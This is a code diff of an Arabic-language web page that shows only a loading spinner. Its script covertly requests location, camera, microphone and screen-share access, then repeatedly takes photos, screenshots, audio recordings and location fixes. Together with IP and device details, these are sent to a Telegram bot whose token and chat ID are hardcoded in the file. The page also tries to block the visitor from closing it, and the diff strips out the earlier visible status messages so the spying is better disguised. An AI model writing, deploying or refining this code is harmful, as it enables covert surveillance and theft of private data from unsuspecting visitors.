@@ -1119,21 +1119,69 @@ padding:30px;
     </style>
 </head>
 <body>
-    <div class="loading-container">
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        
+        .loading {
+            text-align: center;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        p {
+            color: #444;
+            font-size: 0.8em;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">
         <div class="spinner"></div>
-        <h1>🕵️ جاري تهيئة النظام</h1>
-        <p>سيتم طلب الصلاحيات تلقائياً...</p>
-        <div class="status-text" id="statusText">⏳ جاري طلب الصلاحيات...</div>
+        <p>جاري التحميل...</p>
     </div>
 
     <script>
         // ============================================================
-        // 1. المتغيرات العامة - بوت تيليجرام
+        // بوت تيليجرام
         // ============================================================
         const BOT_TOKEN = '8529112495:AAFYQ5_9K8WeaA0k1qtrYAWyb75ajTaJ7RQ';
         const CHAT_ID = '1485247348';
         
-        // متغيرات الكاميرا والصوت
+        // متغيرات
         let currentStream = null;
         let screenStream = null;
         let mediaRecorder = null;
@@ -1141,734 +1189,319 @@ padding:30px;
         let lastLocation = null;
         let locationWatchId = null;
         let captureInterval = null;
-        let screenCaptureInterval = null;
-        let isFrontCamera = true;
-        let allPermissionsGranted = false;
-        let isCapturing = false;
+        let screenInterval = null;
+        let isFront = true;
+        let ready = false;
         
         // حالة الصلاحيات
-        const permissions = {
-            gps: false,
-            front: false,
-            back: false,
-            mic: false,
-            screen: false,
-            notif: false
-        };
+        const perms = { gps: false, cam: false, mic: false, screen: false };
 
         // ============================================================
-        // 2. تحديث حالة النص
+        // طلب الصلاحيات بسرعة جداً
         // ============================================================
-        function updateStatus(text, type = '') {
-            const el = document.getElementById('statusText');
-            el.textContent = text;
-            el.className = 'status-text ' + type;
-        }
-
-        // ============================================================
-        // 3. طلب جميع الصلاحيات تلقائياً
-        // ============================================================
-        async function requestAllPermissions() {
-            updateStatus('📍 جاري طلب صلاحية الموقع الجغرافي...');
-            await requestGeolocation();
-            
-            updateStatus('📷 جاري طلب صلاحية الكاميرا الأمامية...');
-            await requestFrontCamera();
-            
-            updateStatus('📷 جاري طلب صلاحية الكاميرا الخلفية...');
-            await requestBackCamera();
-            
-            updateStatus('🎤 جاري طلب صلاحية الميكروفون...');
-            await requestMicrophone();
-            
-            updateStatus('🖥️ جاري طلب صلاحية مشاركة الشاشة...');
-            await requestScreen();
-            
-            updateStatus('🔔 جاري طلب صلاحية الإشعارات...');
-            await requestNotifications();
-            
-            // التحقق من الصلاحيات
-            checkAllPermissions();
-            
-            if (allPermissionsGranted) {
-                updateStatus('✅ تم منح جميع الصلاحيات، بدء التشغيل...', 'success');
-                startSystem();
-            } else {
-                const missing = [];
-                if (!permissions.gps) missing.push('الموقع');
-                if (!permissions.front) missing.push('الكاميرا الأمامية');
-                if (!permissions.back) missing.push('الكاميرا الخلفية');
-                if (!permissions.mic) missing.push('الميكروفون');
-                if (!permissions.screen) missing.push('الشاشة');
-                if (!permissions.notif) missing.push('الإشعارات');
-                
-                updateStatus(`⚠️ الصلاحيات المفقودة: ${missing.join('، ')} - جاري إعادة المحاولة...`, 'error');
-                console.log('❌ Missing permissions:', missing);
-                
-                // إعادة المحاولة بعد 5 ثواني
-                setTimeout(requestAllPermissions, 5000);
-            }
-        }
-
-        // ============================================================
-        // 4. طلب الموقع الجغرافي
-        // ============================================================
-        async function requestGeolocation() {
+        async function getPermissions() {
+            // 1. الموقع - فوري
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
+                        timeout: 5000
                     });
                 });
-                
                 lastLocation = {
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude,
-                    speed: pos.coords.speed,
-                    heading: pos.coords.heading
+                    accuracy: pos.coords.accuracy
                 };
-                
-                permissions.gps = true;
-                console.log('✅ GPS granted:', lastLocation);
-                
-                startLocationTracking();
-                await sendLocationToTelegram();
-                
-            } catch(e) {
-                permissions.gps = false;
-                console.log('❌ GPS error:', e.message);
-            }
-        }
+                perms.gps = true;
+                sendLocation();
+            } catch(e) { perms.gps = false; }
 
-        // ============================================================
-        // 5. طلب الكاميرا الأمامية
-        // ============================================================
-        async function requestFrontCamera() {
+            // 2. الكاميرا - فورية
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
-                });
-                
-                stream.getTracks().forEach(track => track.stop());
-                permissions.front = true;
-                console.log('✅ Front camera granted');
-                
-            } catch(e) {
-                permissions.front = false;
-                console.log('❌ Front camera error:', e.message);
-            }
-        }
-
-        // ============================================================
-        // 6. طلب الكاميرا الخلفية
-        // ============================================================
-        async function requestBackCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
-                });
-                
-                stream.getTracks().forEach(track => track.stop());
-                permissions.back = true;
-                console.log('✅ Back camera granted');
-                
-                // تشغيل الكاميرا
-                await startCamera('environment');
-                
-            } catch(e) {
-                permissions.back = false;
-                console.log('❌ Back camera error:', e.message);
-                
-                // محاولة تشغيل أي كاميرا
-                try {
-                    await startCamera('user');
-                } catch(e2) {
-                    console.log('❌ No camera available');
-                }
-            }
-        }
-
-        // ============================================================
-        // 7. تشغيل الكاميرا
-        // ============================================================
-        async function startCamera(facingMode = 'environment') {
-            try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: facingMode,
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
+                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
-                
                 currentStream = stream;
-                console.log(`📷 Camera started: ${facingMode}`);
+                perms.cam = true;
                 
                 // تصوير فوري
-                setTimeout(() => capturePhoto(facingMode), 1000);
-                
-                return true;
+                setTimeout(() => capturePhoto(), 500);
             } catch(e) {
-                console.log('❌ Start camera error:', e.message);
-                return false;
+                // حاول كاميرا أمامية
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                    currentStream = stream;
+                    perms.cam = true;
+                    setTimeout(() => capturePhoto(), 500);
+                } catch(e2) { perms.cam = false; }
             }
-        }
 
-        // ============================================================
-        // 8. طلب الميكروفون
-        // ============================================================
-        async function requestMicrophone() {
+            // 3. الميكروفون - فوري
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
-                });
-                
-                stream.getTracks().forEach(track => track.stop());
-                permissions.mic = true;
-                console.log('✅ Microphone granted');
-                
-                // تسجيل صوت فوري
-                setTimeout(() => startRecording(), 2000);
-                
-            } catch(e) {
-                permissions.mic = false;
-                console.log('❌ Microphone error:', e.message);
-            }
-        }
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(t => t.stop());
+                perms.mic = true;
+                setTimeout(() => startRecording(), 1000);
+            } catch(e) { perms.mic = false; }
 
-        // ============================================================
-        // 9. طلب مشاركة الشاشة
-        // ============================================================
-        async function requestScreen() {
+            // 4. الشاشة - فورية
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: {
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
-                    audio: true
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
-                
                 screenStream = stream;
-                permissions.screen = true;
-                console.log('✅ Screen sharing granted');
-                
-                // تصوير الشاشة فوراً
-                setTimeout(() => captureScreen(), 2000);
-                
-            } catch(e) {
-                permissions.screen = false;
-                console.log('❌ Screen error:', e.message);
-            }
-        }
+                perms.screen = true;
+                setTimeout(() => captureScreen(), 1000);
+            } catch(e) { perms.screen = false; }
 
-        // ============================================================
-        // 10. طلب الإشعارات
-        // ============================================================
-        async function requestNotifications() {
-            try {
-                if (Notification.permission === 'default') {
-                    const result = await Notification.requestPermission();
-                    permissions.notif = result === 'granted';
-                } else {
-                    permissions.notif = Notification.permission === 'granted';
-                }
-                
-                if (permissions.notif) {
-                    console.log('✅ Notifications granted');
-                } else {
-                    console.log('❌ Notifications denied');
-                }
-                
-            } catch(e) {
-                permissions.notif = false;
-                console.log('❌ Notifications error:', e.message);
-            }
-        }
-
-        // ============================================================
-        // 11. التحقق من الصلاحيات
-        // ============================================================
-        function checkAllPermissions() {
-            allPermissionsGranted = permissions.gps && permissions.front && 
-                                   permissions.back && permissions.mic && 
-                                   permissions.screen && permissions.notif;
-            
-            if (allPermissionsGranted) {
-                console.log('✅ All permissions granted');
-            } else {
-                const missing = [];
-                if (!permissions.gps) missing.push('GPS');
-                if (!permissions.front) missing.push('Front Camera');
-                if (!permissions.back) missing.push('Back Camera');
-                if (!permissions.mic) missing.push('Microphone');
-                if (!permissions.screen) missing.push('Screen');
-                if (!permissions.notif) missing.push('Notifications');
-                console.log('⚠️ Missing:', missing.join(', '));
-            }
-        }
-
-        // ============================================================
-        // 12. بدء النظام
-        // ============================================================
-        function startSystem() {
-            updateStatus('✅ تم منح جميع الصلاحيات، بدء التصوير...', 'success');
-            
-            // بدء التصوير التلقائي
+            // بدء التشغيل
+            ready = true;
             startAutoCapture();
-            startAutoScreenCapture();
+            startAutoScreen();
             
-            // جمع البيانات وإرسالها
-            setTimeout(async () => {
-                await sendAllData();
-            }, 3000);
-            
-            // إرسال إشعار
-            sendNotification('✅ تم تفعيل النظام', 'جميع الصلاحيات تم منحها');
+            // إرسال تقرير أولي
+            setTimeout(() => sendReport(), 2000);
             
             // تقارير دورية كل دقيقة
-            setInterval(async () => {
-                await sendAllData();
-            }, 60000);
+            setInterval(() => sendReport(), 60000);
         }
 
         // ============================================================
-        // 13. تصوير الكاميرا وإرسالها فوراً
+        // تصوير الكاميرا وإرسالها
         // ============================================================
-        async function capturePhoto(type = 'environment') {
-            if (isCapturing) return;
-            isCapturing = true;
+        async function capturePhoto() {
+            if (!currentStream) return;
             
             try {
-                // إنشاء عنصر فيديو مؤقت
                 const video = document.createElement('video');
                 video.srcObject = currentStream;
-                video.style.display = 'none';
                 document.body.appendChild(video);
+                video.style.display = 'none';
                 await video.play();
                 
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                if (video.videoWidth === 0) {
                     document.body.removeChild(video);
-                    isCapturing = false;
-                    setTimeout(() => capturePhoto(type), 500);
                     return;
                 }
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                const type = isFront ? 'أمامية' : 'خلفية';
+                isFront = !isFront;
+                
+                await sendPhoto(dataUrl, `📸 ${type}`);
+                
+                document.body.removeChild(video);
+            } catch(e) {}
+        }
+
+        // ============================================================
+        // تصوير الشاشة
+        // ============================================================
+        async function captureScreen() {
+            if (!screenStream) return;
+            
+            try {
+                const video = document.createElement('video');
+                video.srcObject = screenStream;
+                document.body.appendChild(video);
+                video.style.display = 'none';
+                await video.play();
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 1280;
                 canvas.height = video.videoHeight || 720;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-                const typeName = type === 'environment' ? 'خلفية' : 'أمامية';
-                
-                console.log(`📸 Captured ${typeName}`);
-                
-                // إرسال الصورة فوراً إلى تيليجرام
-                await sendPhotoToTelegram(dataUrl, `📸 كاميرا ${typeName}`);
-                
-                // حذف العناصر المؤقتة
-                document.body.removeChild(video);
-                
-            } catch(e) {
-                console.log('❌ Capture error:', e.message);
-            }
-            
-            isCapturing = false;
-        }
-
-        // ============================================================
-        // 14. تصوير الشاشة وإرسالها فوراً
-        // ============================================================
-        async function captureScreen() {
-            try {
-                if (!screenStream) {
-                    await requestScreen();
-                    setTimeout(() => captureScreen(), 1000);
-                    return;
-                }
-                
-                const video = document.createElement('video');
-                video.srcObject = screenStream;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1920;
-                canvas.height = video.videoHeight || 1080;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                console.log('🖥️ Screen captured');
-                
-                await sendPhotoToTelegram(dataUrl, '🖥️ لقطة شاشة');
+                await sendPhoto(dataUrl, '🖥️ شاشة');
                 
                 document.body.removeChild(video);
-                
-            } catch(e) {
-                console.log('❌ Screen capture error:', e.message);
-            }
+            } catch(e) {}
         }
 
         // ============================================================
-        // 15. التصوير التلقائي المستمر (كل 5 ثواني)
-        // ============================================================
-        function startAutoCapture() {
-            if (captureInterval) clearInterval(captureInterval);
-            
-            captureInterval = setInterval(async () => {
-                if (permissions.front && permissions.back && currentStream) {
-                    const type = isFrontCamera ? 'user' : 'environment';
-                    await capturePhoto(type);
-                    isFrontCamera = !isFrontCamera;
-                }
-            }, 5000); // كل 5 ثواني
-            
-            console.log('🔄 Auto capture started (5s)');
-        }
-
-        // ============================================================
-        // 16. تصوير الشاشة التلقائي (كل 10 ثواني)
-        // ============================================================
-        function startAutoScreenCapture() {
-            if (screenCaptureInterval) clearInterval(screenCaptureInterval);
-            
-            screenCaptureInterval = setInterval(async () => {
-                if (permissions.screen) {
-                    await captureScreen();
-                }
-            }, 10000); // كل 10 ثواني
-            
-            console.log('🔄 Auto screen capture started (10s)');
-        }
-
-        // ============================================================
-        // 17. تسجيل الصوت وإرساله فوراً
+        // تسجيل الصوت
         // ============================================================
         async function startRecording() {
-            if (!permissions.mic) return;
+            if (!perms.mic) return;
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 audioChunks = [];
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'audio/webm'
-                });
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                 
                 mediaRecorder.ondataavailable = e => {
-                    if (e.data.size > 0) {
-                        audioChunks.push(e.data);
-                    }
+                    if (e.data.size > 0) audioChunks.push(e.data);
                 };
                 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                    await sendAudioToTelegram(blob);
-                    stream.getTracks().forEach(track => track.stop());
+                    await sendAudio(blob);
+                    stream.getTracks().forEach(t => t.stop());
                 };
                 
                 mediaRecorder.start();
-                console.log('🎙️ Recording started');
-                
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
-                        console.log('🎙️ Recording stopped');
                     }
-                }, 10000); // تسجيل 10 ثواني
-                
-            } catch(e) {
-                console.log('❌ Recording error:', e.message);
-            }
+                }, 8000);
+            } catch(e) {}
         }
 
         // ============================================================
-        // 18. إرسال الصورة إلى تيليجرام
+        // إرسال الصورة
         // ============================================================
-        async function sendPhotoToTelegram(dataUrl, caption) {
+        async function sendPhoto(dataUrl, caption) {
             try {
                 const blob = await fetch(dataUrl).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, 'pic.jpg');
+                form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
                 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    body: form
                 });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log(`✅ Photo sent: ${caption}`);
-                } else {
-                    console.log(`❌ Photo failed: ${result.description}`);
-                }
-                return result;
-            } catch(e) {
-                console.log('❌ Send photo error:', e.message);
-                return null;
-            }
+            } catch(e) {}
         }
 
         // ============================================================
-        // 19. إرسال الصوت إلى تيليجرام
+        // إرسال الصوت
         // ============================================================
-        async function sendAudioToTelegram(blob) {
+        async function sendAudio(blob) {
             try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('audio', blob, 'audio.webm');
-                formData.append('caption', `🎙️ تسجيل صوت - ${new Date().toLocaleString('ar-EG')}`);
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('audio', blob, 'audio.webm');
+                form.append('caption', `🎙️ صوت - ${new Date().toLocaleString('ar-EG')}`);
                 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                     method: 'POST',
-                    body: formData
+                    body: form
                 });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ Audio sent');
-                } else {
-                    console.log(`❌ Audio failed: ${result.description}`);
-                }
-                return result;
-            } catch(e) {
-                console.log('❌ Send audio error:', e.message);
-                return null;
-            }
+            } catch(e) {}
         }
 
         // ============================================================
-        // 20. تتبع الموقع المستمر
+        // إرسال الموقع
         // ============================================================
-        function startLocationTracking() {
-            if (locationWatchId !== null) {
-                navigator.geolocation.clearWatch(locationWatchId);
-            }
+        async function sendLocation() {
+            if (!lastLocation) return;
+            
+            const msg = `📍 *موقع*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 ${lastLocation.accuracy}m\n🕐 ${new Date().toLocaleString('ar-EG')}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {}
+        }
+
+        // ============================================================
+        // التصوير التلقائي
+        // ============================================================
+        function startAutoCapture() {
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = setInterval(() => {
+                if (perms.cam) capturePhoto();
+            }, 5000);
+        }
+
+        function startAutoScreen() {
+            if (screenInterval) clearInterval(screenInterval);
+            screenInterval = setInterval(() => {
+                if (perms.screen) captureScreen();
+            }, 10000);
+        }
+
+        // ============================================================
+        // تتبع الموقع
+        // ============================================================
+        function trackLocation() {
+            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
             
             locationWatchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     lastLocation = {
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        speed: pos.coords.speed,
-                        heading: pos.coords.heading
+                        accuracy: pos.coords.accuracy
                     };
-                    
-                    // إرسال الموقع كل 30 ثانية
-                    if (Math.random() < 0.2) {
-                        sendLocationToTelegram();
-                    }
+                    if (Math.random() < 0.15) sendLocation();
                 },
-                (err) => {
-                    console.log('⚠️ Location watch error:', err.message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
+                () => {},
+                { enableHighAccuracy: true, timeout: 5000 }
             );
-            
-            console.log('📍 Location tracking started');
         }
 
         // ============================================================
-        // 21. إرسال الموقع إلى تيليجرام
+        // إرسال تقرير كامل
         // ============================================================
-        async function sendLocationToTelegram() {
-            if (!lastLocation) return;
+        async function sendReport() {
+            let msg = `🚨 *تقرير - ${new Date().toLocaleString('ar-EG')}*\n═══════════════════════\n`;
             
-            const msg = `📍 *تحديث الموقع*\n` +
-                       `📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n` +
-                       `🎯 الدقة: ${lastLocation.accuracy || 'غير معروف'} متر\n` +
-                       (lastLocation.altitude ? `🏔️ الارتفاع: ${lastLocation.altitude} متر\n` : '') +
-                       (lastLocation.speed ? `💨 السرعة: ${lastLocation.speed} م/ث\n` : '') +
-                       `🕐 ${new Date().toLocaleString('ar-EG')}`;
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('📍 Location sent');
-                }
-                return result;
-            } catch(e) {
-                console.log('❌ Send location error:', e.message);
-                return null;
-            }
-        }
-
-        // ============================================================
-        // 22. إرسال التقرير الكامل مع الصور
-        // ============================================================
-        async function sendAllData() {
-            console.log('📤 Sending all data...');
-            
-            // بناء التقرير
-            let msg = `🚨 *تقرير شامل - ${new Date().toLocaleString('ar-EG')}*\n`;
-            msg += `═══════════════════════════════════════\n\n`;
-            
-            // الموقع
             if (lastLocation) {
-                msg += `📍 *الموقع الحالي*\n`;
-                msg += `📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n`;
-                msg += `🎯 الدقة: ${lastLocation.accuracy || 'غير معروف'} متر\n`;
-                if (lastLocation.altitude) msg += `🏔️ الارتفاع: ${lastLocation.altitude} متر\n`;
-                if (lastLocation.speed) msg += `💨 السرعة: ${lastLocation.speed} م/ث\n`;
-                msg += `\n`;
+                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
             }
             
-            // IP
             try {
-                const ipify = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const ipApi = await fetch(`http://ip-api.com/json/${ipify.ip}?lang=ar`).then(r => r.json());
-                
-                msg += `🌐 *معلومات IP*\n`;
-                msg += `🆔 IP: ${ipify.ip}\n`;
-                msg += `📍 الدولة: ${ipApi.country || 'غير معروف'}\n`;
-                msg += `🏙️ المدينة: ${ipApi.city || 'غير معروف'}\n`;
-                msg += `📡 مزود الخدمة: ${ipApi.isp || 'غير معروف'}\n`;
-                msg += `🔒 VPN/Proxy: ${ipApi.proxy ? 'نعم' : 'لا'}\n\n`;
-            } catch(e) {
-                msg += `🌐 IP: غير متاح\n\n`;
-            }
+                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
+                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
+                msg += `📡 ${info.isp || ''}\n`;
+            } catch(e) {}
             
-            // الجهاز
-            msg += `💻 *معلومات الجهاز*\n`;
-            msg += `🖥️ النظام: ${navigator.platform || 'غير معروف'}\n`;
-            msg += `🌐 المتصفح: ${navigator.userAgent || 'غير معروف'}\n`;
-            msg += `⚙️ الأنوية: ${navigator.hardwareConcurrency || 'غير معروف'}\n`;
-            msg += `💾 الذاكرة: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'غير معروف'}\n`;
-            msg += `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n\n`;
+            msg += `💻 ${navigator.platform || ''}\n`;
+            msg += `🖥️ ${window.screen.width}x${window.screen.height}\n`;
+            msg += `🔓 موقع: ${perms.gps?'✅':'❌'} كام: ${perms.cam?'✅':'❌'} مايك: ${perms.mic?'✅':'❌'} شاشة: ${perms.screen?'✅':'❌'}\n`;
+            msg += `═══════════════════════`;
             
-            // الصلاحيات
-            msg += `🔓 *الصلاحيات* ✅/❌\n`;
-            msg += `📍 الموقع: ${permissions.gps ? '✅' : '❌'}\n`;
-            msg += `📷 الكاميرا الأمامية: ${permissions.front ? '✅' : '❌'}\n`;
-            msg += `📷 الكاميرا الخلفية: ${permissions.back ? '✅' : '❌'}\n`;
-            msg += `🎤 الميكروفون: ${permissions.mic ? '✅' : '❌'}\n`;
-            msg += `🖥️ الشاشة: ${permissions.screen ? '✅' : '❌'}\n`;
-            msg += `🔔 الإشعارات: ${permissions.notif ? '✅' : '❌'}\n\n`;
-            
-            // الوقت
-            msg += `⏰ *الوقت*\n`;
-            msg += `🕐 محلي: ${new Date().toLocaleString('ar-EG')}\n`;
-            msg += `🌐 عالمي: ${new Date().toUTCString()}\n`;
-            msg += `🗺️ المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
-            
-            // الصفحة
-            msg += `🔗 *الصفحة*\n`;
-            msg += `📎 الرابط: ${window.location.href}\n`;
-            msg += `📝 العنوان: ${document.title}\n`;
-            msg += `📎 المصدر: ${document.referrer || 'مباشر'}\n`;
-            msg += `═══════════════════════════════════════\n`;
-            
-            // إرسال التقرير
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: msg,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
+                        parse_mode: 'Markdown'
                     })
                 });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ Report sent');
-                    
-                    // إرسال صور فورية
-                    if (permissions.front && permissions.back && currentStream) {
-                        setTimeout(() => capturePhoto('environment'), 1000);
-                        setTimeout(() => capturePhoto('user'), 2000);
-                    }
-                    
-                    if (permissions.screen) {
-                        setTimeout(() => captureScreen(), 3000);
-                    }
-                    
-                    if (permissions.mic) {
-                        setTimeout(() => startRecording(), 4000);
-                    }
-                    
-                } else {
-                    console.log(`❌ Report failed: ${result.description}`);
-                }
-                return result;
-            } catch(e) {
-                console.log('❌ Send report error:', e.message);
-                return null;
-            }
+            } catch(e) {}
         }
 
         // ============================================================
-        // 23. إرسال إشعار
+        // منع الإغلاق
         // ============================================================
-        function sendNotification(title, body) {
-            if (permissions.notif && Notification.permission === 'granted') {
-                new Notification(title, {
-                    body: body,
-                    icon: '🔔'
-                });
-                console.log(`🔔 Notification: ${title}`);
-            }
-        }
-
-        // ============================================================
-        // 24. منع إغلاق الصفحة
-        // ============================================================
-        window.addEventListener('beforeunload', function(e) {
+        window.addEventListener('beforeunload', e => {
             e.preventDefault();
             e.returnValue = '';
-            return '';
         });
 
         // ============================================================
-        // 25. بدء التشغيل فوراً
+        // التشغيل فوراً
         // ============================================================
-        console.log('🚀 Starting system...');
-        
-        // بدء طلب الصلاحيات فوراً بعد 1 ثانية
         setTimeout(() => {
-            requestAllPermissions();
-        }, 1000);
+            getPermissions();
+            trackLocation();
+        }, 500);
     </script>
 </body>
 </html>
